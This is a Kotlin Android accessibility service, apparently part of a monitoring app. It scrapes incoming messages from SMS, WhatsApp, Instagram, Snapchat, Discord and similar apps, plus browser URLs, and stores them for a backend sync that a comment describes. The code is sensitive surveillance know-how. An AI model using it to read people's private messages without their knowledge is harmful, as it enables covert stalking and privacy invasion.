package com.example.malaki

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.malaki.db.BackendSyncManager
import com.example.malaki.db.EventRepository
import kotlinx.coroutines.runBlocking
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.component1
import kotlin.collections.component2
import kotlin.collections.set

class MessageAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MESSAGE_SERVICE"
        private val seenMessages = Collections.synchronizedSet(mutableSetOf<String>())
        private var lastProcessTime = 0L
        private const val MIN_PROCESS_INTERVAL = 500L
        private var lastCapturedUrl: String? = null
    }

    private val messagingApps = listOf(
        "com.google.android.apps.messaging",
        "com.android.mms",
        "com.whatsapp",
        "com.facebook.orca",
        "com.instagram.android",
        "com.twitter.android",
        "com.snapchat.android",
        "com.discord"
    )

    private val browserApps = listOf(
        "com.android.chrome",
        "com.google.android.apps.chrome",
        "org.mozilla.firefox",
        "com.brave.browser",
        "com.opera.browser",
        "com.microsoft.emmx"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "✅ Message Service CONNECTED!")

        // Clear in-memory dedup on reconnect
        seenMessages.clear()

        // Prune SharedPreferences hashes once per day so a reinstall doesn't re-replay history
        val prefs = applicationContext.getSharedPreferences("sent_messages", Context.MODE_PRIVATE)
        val lastPrune = prefs.getLong("last_hash_prune", 0L)
        if (System.currentTimeMillis() - lastPrune > 24 * 60 * 60 * 1000L) {
            prefs.edit()
                .putStringSet("sent_hashes", mutableSetOf())
                .putLong("last_hash_prune", System.currentTimeMillis())
                .apply()
            Log.d(TAG, "🧹 Pruned sent_hashes (24h rotation)")
        }

        val info = AccessibilityServiceInfo()
        // TYPE_WINDOW_STATE_CHANGED  → browser page navigation (URL bar updates)
        // TYPE_WINDOW_CONTENT_CHANGED → new message arrived in open conversation (live only)
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 100
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS

        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        val isBrowser = browserApps.any { packageName.contains(it, ignoreCase = true) }
        val isMessaging = messagingApps.any { packageName.contains(it, ignoreCase = true) } ||
                packageName.contains("messaging")

        if (!isMessaging && !isBrowser) return

        // ── Browser: capture URL only when the user navigates to a new page ────
        if (isBrowser && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val rootNode = rootInActiveWindow ?: return
            try {
                val url = captureBrowserUrl(rootNode, packageName)
                url?.takeIf { it.isNotBlank() && it != lastCapturedUrl && it.startsWith("http") }
                    ?.let {
                        lastCapturedUrl = it
                        Log.d(TAG, "🌐 Browser URL: $it")
                        saveBrowserUrl(packageName, it)
                        extractAndAnalyzeUrls(it)
                    }
            } finally {
                rootNode.recycle()
            }
            return
        }

        // ── Messaging: only react to CONTENT_CHANGED (new message arrived) ──────
        // WINDOW_STATE_CHANGED fires when the app *opens* → would scan conversation history.
        // WINDOW_CONTENT_CHANGED fires when the conversation view gets new content (live).
        if (isMessaging && event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastProcessTime < MIN_PROCESS_INTERVAL) return
            lastProcessTime = currentTime

            // Prefer event.source (only the subtree that changed = new message node)
            // Fall back to rootInActiveWindow only if source is unavailable.
            val scanNode = event.source ?: rootInActiveWindow ?: return
            try {
                Log.d(TAG, "💬 Content changed in $packageName — scanning for new messages")
                val messages = extractMessages(scanNode, packageName)
                messages.forEach { message ->
                    if (message.isNotBlank() && !isSystemText(message)) {
                        saveMessage(packageName, message)
                        extractAndAnalyzeUrls(message)
                    }
                }
            } finally {
                scanNode.recycle()
            }
        }
    }

    private fun saveMessage(packageName: String, text: String) {
        try {
            if (text.isBlank()) return

            var cleanText = text
                .replace(Regex("\\[\\d{4}-\\d{2}-\\d{2}\\s+\\d{2}:\\d{2}:\\d{2}\\]"), "")
                .replace(Regex("\\[com\\.[a-z]+\\.[a-z]+\\]"), "")
                .trim()

            if (cleanText.isEmpty() || cleanText.length < 5) return

            val messageHash = "${packageName}|${cleanText.hashCode()}"

            // Session dedup
            if (seenMessages.contains(messageHash)) return
            seenMessages.add(messageHash)

            // Persistent dedup (SharedPreferences)
            val prefs = applicationContext.getSharedPreferences("sent_messages", Context.MODE_PRIVATE)
            val sentHashes = prefs.getStringSet("sent_hashes", mutableSetOf())?.toMutableSet() ?: mutableSetOf()

            if (sentHashes.contains(messageHash)) return

            sentHashes.add(messageHash)
            prefs.edit().putStringSet("sent_hashes", sentHashes).apply()

            // Save to Room only — BackgroundService syncs to backend every 60s.
            // Do NOT call syncPendingEvents() here: this runs on the main thread
            // (accessibility callback), which throws NetworkOnMainThreadException.
            runBlocking {
                val repository = EventRepository(applicationContext)
                repository.ensureDeviceProfile()
                repository.captureEvent(
                    eventType = "MESSAGE",
                    sourceApp = packageName,
                    senderRole = "OTHER",
                    rawText = cleanText,
                    textPreview = cleanText.take(100),
                    timestampUtc = System.currentTimeMillis()
                )
                Log.d(TAG, "✅ Sent to Room: ${cleanText.take(50)}")
            }

            // ❌ DO NOT write to messages.txt anymore!
            // val file = File(filesDir, "messages.txt")
            // file.appendText(...)

        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "❌ Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    private fun captureBrowserUrl(rootNode: AccessibilityNodeInfo, packageName: String): String? {
        var capturedUrl: String? = null

        val chromeAddressBarId = "com.android.chrome:id/url_bar"
        val nodes = rootNode.findAccessibilityNodeInfosByViewId(chromeAddressBarId)

        if (nodes != null && nodes.isNotEmpty()) {
            val urlNode = nodes[0]
            if (urlNode.text != null && urlNode.text.toString().isNotBlank()) {
                capturedUrl = urlNode.text.toString()
            }
            urlNode.recycle()
        }

        if (capturedUrl == null) {
            val httpNodes = rootNode.findAccessibilityNodeInfosByText("http")
            for (node in httpNodes) {
                if (node.text != null &&
                    (node.text.toString().startsWith("http://") ||
                            node.text.toString().startsWith("https://"))) {
                    capturedUrl = node.text.toString()
                    node.recycle()
                    break
                }
                node.recycle()
            }
        }

        return capturedUrl
    }

    private fun extractAndAnalyzeUrls(text: String) {
        val urlRegex = Regex("https?://[\\w\\-._~:/?#\\[\\]@!$&'()*+,;=]+")
        urlRegex.findAll(text).forEach { match ->
            val url = match.value
            Log.d(TAG, "🔍 Found URL to analyze: $url")
            try {
                val dataCollector = DataCollector(applicationContext)
                dataCollector.analyzeUrlAndSave(url)
            } catch (e: Exception) {
                Log.e(TAG, "Error analyzing URL: ${e.message}")
            }
        }
    }

    private fun saveBrowserUrl(packageName: String, url: String) {
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val logEntry = "[$timestamp] [$packageName] [BROWSER] $url\n"
            val file = File(filesDir, "browser_history.txt")
            file.appendText(logEntry)
            Log.d(TAG, "💾 Saved browser URL: ${url.take(50)}")
        } catch (e: Exception) {
            Log.e(TAG, "Error saving browser URL: ${e.message}")
        }
    }

    private fun extractMessages(node: AccessibilityNodeInfo, packageName: String): List<String> {
        val messageList = mutableListOf<String>()

        node.text?.toString()?.let { text ->
            if (isLikelyMessage(text)) {
                messageList.add(text)
            }
        }

        node.contentDescription?.toString()?.let { text ->
            if (isLikelyMessage(text)) {
                messageList.add(text)
            }
        }

        when {
            packageName.contains("whatsapp") -> {
                node.viewIdResourceName?.let { id ->
                    if (id.contains("message") || id.contains("conversation")) {
                        node.text?.toString()?.let { messageList.add(it) }
                    }
                }
            }
            packageName.contains("instagram") -> {
                node.viewIdResourceName?.let { id ->
                    if (id.contains("direct") || id.contains("message")) {
                        node.text?.toString()?.let { messageList.add(it) }
                    }
                }
            }
            packageName.contains("messaging") || packageName.contains("mms") -> {
                node.viewIdResourceName?.let { id ->
                    if (id.contains("message") || id.contains("conversation") || id.contains("snippet")) {
                        node.text?.toString()?.let { messageList.add(it) }
                    }
                }
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                messageList.addAll(extractMessages(child, packageName))
                child.recycle()
            }
        }

        return messageList.distinct()
    }

    private fun isLikelyMessage(text: String): Boolean {
        val lowerText = text.lowercase(Locale.getDefault())

        if (text.length < 5) return false
        if (text.matches(Regex("\\d{1,2}:\\d{2}(\\s?(AM|PM))?"))) return false

        val uiElements = listOf(
            "send", "type a message", "message", "chat", "back", "menu",
            "settings", "search", "call", "video", "attach", "emoji",
            "gif", "sticker", "mic", "camera", "gallery", "send message"
        )

        if (uiElements.any { lowerText == it || lowerText.startsWith("$it ") || lowerText.endsWith(" $it") }) {
            return false
        }

        return text.contains(Regex("[😀-🙏]")) ||
                text.contains(Regex("https?://")) ||
                text.contains(Regex("[.!?]\\s+\\w")) ||
                text.length > 20 ||
                text.split(" ").size > 3
    }

    private fun isSystemText(text: String): Boolean {
        val systemWords = listOf(
            "back", "send", "home", "menu", "settings", "ok", "cancel", "submit",
            "search", "close", "next", "previous", "play", "pause", "stop",
            "notification", "alert", "dialog", "button", "tab", "icon", "image",
            "video", "audio", "loading", "progress", "wait", "please wait",
            "type a message", "tap to retry", "online", "offline", "typing..."
        )

        val lowerText = text.lowercase(Locale.getDefault())
        return systemWords.any { lowerText.contains(it) } ||
                text.length < 3 ||
                text.all { it.isWhitespace() || it == '.' || it == ',' } ||
                text.matches(Regex("\\d+"))
    }

    private fun getEventTypeString(eventType: Int): String {
        return when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICK"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUS"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "WINDOW"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "CONTENT"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "NOTIFY"
            else -> "UNKNOWN($eventType)"
        }
    }
}